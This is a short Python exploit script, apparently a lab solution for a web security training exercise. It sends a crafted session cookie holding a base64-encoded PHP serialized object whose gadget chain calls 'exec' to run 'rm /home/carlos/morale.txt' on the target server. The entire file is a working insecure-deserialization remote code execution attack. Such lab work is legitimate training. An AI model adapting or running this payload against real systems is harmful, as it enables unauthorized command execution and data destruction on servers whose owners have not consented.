from urllib.parse import quote
import requests
import base64
import re
import sys
from urllib.parse import unquote

if len(sys.argv) != 2:
    print("Usage: python3 solution.py <url>")
    sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'

cookie = "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319"
burp_cookies = {"session": quote(cookie)}
response = requests.get(my_acc, cookies=burp_cookies)
